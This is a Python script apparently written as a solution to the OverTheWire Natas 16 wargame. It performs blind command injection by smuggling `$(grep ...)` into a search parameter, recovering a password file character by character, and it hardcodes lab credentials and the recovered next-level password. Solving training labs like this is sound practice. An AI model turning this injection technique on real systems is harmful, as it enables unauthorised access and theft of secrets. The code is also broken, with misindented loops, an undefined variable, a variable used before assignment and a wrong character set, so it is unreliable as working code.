import requests

url = "http://natas16.natas.labs.overthewire.org/"
username = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
all_possible_chars = '0123456789abcdefghijklmnopqrstuvwxysABCDEFGHIJKLMNOPQRSTUVWXYZ'


def find_password_chars(all_possible_chars, url, username, password):
	lis = []
	for i in all_possible_chars:
	params = {'needle': "$(grep " + i + " /etc/natas_webpass/natas17)elephant"}
	r = requests.get(url, params=params, auth = (username, password))
	if 'elephant' not in r.text:
		lis.append(i)
	return "".join(lis)

def find_password(password_chars, url, username, password):
	while (len(natas17_password)<32):
  		for i in lis:
    		params = {'needle': "$(grep ^" + ''.join(password_chars) + i + " /etc/natas_webpass/natas17)elephant"}
    		r = requests.get(url, params=params, auth = (username, password))
    		if 'elephant' not in r.text:
     			password_chars.append(i)
      			natas17_password = natas17_password + i
      			print(natas17_password)
      
password_chars = find_password_chars(all_possible_chars, url, username, password)
find_password(password_chars, url, username, password)

# natas17_password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw